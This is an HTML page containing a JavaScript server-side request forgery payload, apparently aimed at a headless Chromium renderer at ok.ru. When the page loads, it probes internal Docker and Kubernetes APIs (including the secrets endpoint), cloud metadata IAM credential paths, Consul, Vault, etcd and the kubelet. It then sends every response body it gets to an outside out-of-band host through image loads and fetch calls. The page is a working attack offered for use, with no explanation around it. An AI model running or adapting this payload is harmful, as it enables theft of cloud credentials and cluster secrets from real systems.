<!DOCTYPE html>

<head><meta charset="utf-8"><title>OK</title></head>

<script>
'use strict';
// ok.ru Chromium SSRF — escalation probe v2
// OOB: d9j2sgb6b8m92s73q8v0ixyk7io8j763i.oast.pro (profile action button session)
const OOB = 'd9j2sgb6b8m92s73q8v0ixyk7io8j763i.oast.pro';
const T0 = Date.now();

// Sanitize label for DNS subdomain (a-z0-9 and hyphen only, max 60 chars)
const clean = (s) => s.toLowerCase().replace(/[^a-z0-9-]/g, '-').replace(/-+/g, '-').replace(/^-|-$/g, '').substring(0, 60);

// Exfil: Image (no-cors HTTPS, bypasses PNA/CORS for GET) + fetch no-cors fallback
const oob = (label, data) => {
  const j = data !== undefined ? JSON.stringify(data).substring(0, 250) : '';
  const url = `https://${clean(label)}.${OOB}/?v=${encodeURIComponent(j)}`;
  new Image().src = url;
  fetch(url, { mode: 'no-cors', signal: AbortSignal.timeout(6000) }).catch(() => {});
};

// Full CORS read attempt — records error type + timing
const tryRead = async (url, timeoutMs = 8000) => {
  const t0 = Date.now();
  try {
    const r = await fetch(url, { signal: AbortSignal.timeout(timeoutMs) });
    const body = await r.text();
    return { ms: Date.now() - t0, ok: true, status: r.status, body: body.substring(0, 500) };
  } catch (e) {
    return { ms: Date.now() - t0, ok: false, err: e.name + ':' + e.message.substring(0, 100) };
  }
};

// no-cors timing only (sends request, can't read response)
const timingProbe = async (url, timeoutMs = 5000) => {
  const t0 = Date.now();
  try {
    await fetch(url, { mode: 'no-cors', signal: AbortSignal.timeout(timeoutMs) });
    return { ms: Date.now() - t0, state: 'sent' };
  } catch (e) {
    return { ms: Date.now() - t0, state: e.name };
  }
};

// WebSocket probe (different path than fetch — bypasses some PNA checks)
const wsProbe = (url, label) => new Promise(resolve => {
  try {
    const ws = new WebSocket(url);
    ws.onopen  = () => { oob(`${label}-ws-open`,  { url }); };
    ws.onmessage = (e) => { oob(`${label}-ws-msg`, { data: e.data.substring(0, 400) }); ws.close(); };
    ws.onerror = (e) => { oob(`${label}-ws-err`,  { type: e.type }); };
    ws.onclose = (e) => { oob(`${label}-ws-close`, { code: e.code, reason: String(e.reason).substring(0, 50) }); };
    setTimeout(() => { try { ws.close(); } catch(_){} resolve(); }, 8000);
  } catch (e) {
    oob(`${label}-ws-exc`, { err: e.message.substring(0, 80) });
    resolve();
  }
});

(async () => {
  // ── ANNOUNCE ──────────────────────────────────────────────────────────────
  oob('exec-v2', { ua: navigator.userAgent.substring(0, 120), ts: T0 });

  // ── DOCKER API (172.17.0.1:2375) ─────────────────────────────────────────
  // Try full CORS read first — if PNA is relaxed in this headless, we get data
  const dockerEndpoints = [
    '/_ping',
    '/version',
    '/info',
    '/containers/json',
    '/images/json',
  ];
  for (const ep of dockerEndpoints) {
    const url = `http://172.17.0.1:2375${ep}`;
    const r = await tryRead(url, 5000);
    oob(`docker${ep.replace(/\//g, '-')}`, r);
    // If we actually got data — send full body separately
    if (r.ok) {
      oob(`DOCKER-HIT${ep.replace(/\//g, '-')}`, { CRITICAL: true, status: r.status, body: r.body });
    }
  }

  // Also try alternative Docker bridge addresses
  for (const ip of ['172.18.0.1', '172.16.0.1']) {
    const r = await timingProbe(`http://${ip}:2375/_ping`, 2000);
    oob(`docker-alt-${ip.replace(/\./g, '-')}`, r);
  }

  // ── KUBERNETES API (10.96.0.1) ───────────────────────────────────────────
  const k8sEndpoints = [
    '/api',
    '/api/v1',
    '/api/v1/namespaces',
    '/api/v1/pods',
    '/api/v1/secrets',
    '/api/v1/configmaps',
    '/apis/apps/v1/deployments',
    '/healthz',
    '/version',
  ];
  for (const ep of k8sEndpoints) {
    const url = `http://10.96.0.1:8080${ep}`;
    const r = await tryRead(url, 8000);
    oob(`k8s-8080${ep.replace(/\//g, '-')}`, r);
    if (r.ok) {
      oob(`K8S-HIT${ep.replace(/\//g, '-')}`, { CRITICAL: true, status: r.status, body: r.body });
    }
  }

  // K8s port 6443 (TLS — try https://)
  const r6443 = await tryRead('https://10.96.0.1:6443/api', 8000);
  oob('k8s-6443-api', r6443);

  // K8s WebSocket watch — often bypasses CORS checks on insecure port
  await wsProbe('ws://10.96.0.1:8080/api/v1/pods?watch=true', 'k8s-ws-pods');
  await wsProbe('ws://10.96.0.1:8080/api/v1/events?watch=true', 'k8s-ws-events');

  // ── IMDS ─────────────────────────────────────────────────────────────────
  // Full read attempt (previous: only 80ms timeout; now 5s to see if response arrives)
  const imdsTargets = {
    'imds-root':  'http://169.254.169.254/',
    'imds-meta':  'http://169.254.169.254/latest/meta-data/',
    'imds-iam':   'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'imds-token': 'http://169.254.169.254/latest/api/token',
    'imds-yc':    'http://169.254.169.254/computeMetadata/v1/project/project-id',
  };
  for (const [label, url] of Object.entries(imdsTargets)) {
    const r = await tryRead(url, 5000);
    oob(label, r);
    if (r.ok) oob(`IMDS-HIT-${label}`, { CRITICAL: true, body: r.body });
  }

  // ── INTERNAL CONSUL/VAULT/ETCD ───────────────────────────────────────────
  const internalSvcs = {
    'consul-8500':  'http://10.96.0.1:8500/v1/agent/self',
    'vault-8200':   'http://10.96.0.1:8200/v1/sys/health',
    'etcd-2379':    'http://10.96.0.1:2379/health',
    'etcd-2380':    'http://10.96.0.1:2380/members',
    'docker-9323':  'http://172.17.0.1:9323/metrics',   // Docker metrics endpoint
    'k8s-10250':    'https://10.96.0.1:10250/pods',     // kubelet API (if exposed)
  };
  for (const [label, url] of Object.entries(internalSvcs)) {
    const r = await tryRead(url, 5000);
    oob(label, r);
    if (r.ok) oob(`SVC-HIT-${label}`, { CRITICAL: true, body: r.body });
  }

  // ── DONE ─────────────────────────────────────────────────────────────────
  oob('done-v2', { elapsed: Date.now() - T0 });
})();
</script>
